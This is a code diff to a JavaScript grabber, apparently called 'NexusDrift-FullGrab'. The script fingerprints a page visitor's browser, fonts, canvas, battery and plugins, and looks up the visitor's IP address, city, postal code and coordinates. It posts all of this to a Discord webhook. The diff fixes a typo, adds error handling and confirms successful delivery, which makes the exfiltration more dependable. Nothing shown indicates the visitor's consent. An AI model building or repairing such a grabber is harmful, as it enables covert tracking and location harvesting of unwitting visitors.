@@ -86,7 +86,7 @@ async function getAllInfo() {
     // Basic browser / device
     info.userAgent = navigator.userAgent;
     info.platform = navigator.platform;
-    info.language = navig.language;
+    info.language = navigator.language;  // FIXED: was "navig.language"
     info.languages = navigator.languages;
     info.cookieEnabled = navigator.cookieEnabled;
     info.doNotTrack = navigator.doNotTrack;
@@ -114,9 +114,14 @@ async function getAllInfo() {
 
     // Battery (if available)
     if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        info.batteryLevel = battery.level * 100 + "%";
-        info.batteryCharging = battery.charging;
+        try {
+            const battery = await navigator.getBattery();
+            info.batteryLevel = battery.level * 100 + "%";
+            info.batteryCharging = battery.charging;
+        } catch(e) {
+            info.batteryLevel = "N/A";
+            info.batteryCharging = "N/A";
+        }
     } else {
         info.batteryLevel = "N/A";
         info.batteryCharging = "N/A";
@@ -147,7 +152,7 @@ async function getAllInfo() {
     ctx.fillRect(0, 0, 100, 50);
     ctx.fillStyle = "#069";
     ctx.fillText("NexusDrift", 10, 20);
-    info.canvasFingerprint = canvasFp.toDataURL().slice(0, 100); // shortened, full is too long
+    info.canvasFingerprint = canvasFp.toDataURL().slice(0, 100);
 
     // Installed fonts (via JS detection)
     const testFonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Comic Sans MS", "Impact", "Georgia", "Tahoma", "Trebuchet MS", "Arial Black", "Lucida Console", "Roboto", "Open Sans", "Lato", "Montserrat"];
@@ -179,7 +184,7 @@ async function getAllInfo() {
     document.body.removeChild(fontTestDiv);
     info.installedFonts = installed.slice(0, 15).join(", ");
 
-    // Plugins (legacy but still useful)
+    // Plugins
     const plugins = [];
     for (let i = 0; i < navigator.plugins.length; i++) {
         plugins.push(navigator.plugins[i].name);
@@ -189,21 +194,32 @@ async function getAllInfo() {
     // Touch support
     info.touchSupport = "ontouchstart" in window || navigator.maxTouchPoints > 0;
 
-    // Local storage / session storage available
+    // Local / session storage
     info.localStorage = !!window.localStorage;
     info.sessionStorage = !!window.sessionStorage;
 
-    // IP + geolocation (your existing ipapi.co)
-    const ipRes = await fetch('https://ipapi.co/json/');
-    const ipData = await ipRes.json();
-    info.ip = ipData.ip || "N/A";
-    info.city = ipData.city || "N/A";
-    info.country = ipData.country_name || "N/A";
-    info.region = ipData.region || "N/A";
-    info.postal = ipData.postal || "N/A";
-    info.latitude = ipData.latitude || "N/A";
-    info.longitude = ipData.longitude || "N/A";
-    info.org = ipData.org || "N/A";
+    // IP + geolocation
+    try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        info.ip = ipData.ip || "N/A";
+        info.city = ipData.city || "N/A";
+        info.country = ipData.country_name || "N/A";
+        info.region = ipData.region || "N/A";
+        info.postal = ipData.postal || "N/A";
+        info.latitude = ipData.latitude || "N/A";
+        info.longitude = ipData.longitude || "N/A";
+        info.org = ipData.org || "N/A";
+    } catch(e) {
+        info.ip = "N/A (fetch failed)";
+        info.city = "N/A";
+        info.country = "N/A";
+        info.region = "N/A";
+        info.postal = "N/A";
+        info.latitude = "N/A";
+        info.longitude = "N/A";
+        info.org = "N/A";
+    }
 
     return info;
 }
@@ -213,7 +229,6 @@ async function sendFullLog(eventType) {
     try {
         const allData = await getAllInfo();
 
-        // Format for Discord embed (max 1024 chars per field)
         const fields = [];
         for (const [key, val] of Object.entries(allData)) {
             let strVal = String(val);
@@ -225,18 +240,24 @@ async function sendFullLog(eventType) {
             username: "NexusDrift-FullGrab",
             embeds: [{
                 title: eventType,
-                color: 0xFF0000, // red for full grab
-                fields: fields.slice(0, 25), // Discord limit ~25 fields
+                color: 0xFF0000,
+                fields: fields.slice(0, 25),
                 timestamp: new Date().toISOString(),
                 footer: { text: "Nexus Drift — full device fingerprint" }
             }]
         };
 
-        await fetch(webhookURL, {
+        const response = await fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
+
+        if (response.ok) {
+            console.log("✅ Sent to Discord successfully");
+        } else {
+            console.log("❌ Discord returned:", response.status);
+        }
     } catch (err) {
         console.log("Send failed", err);
     }
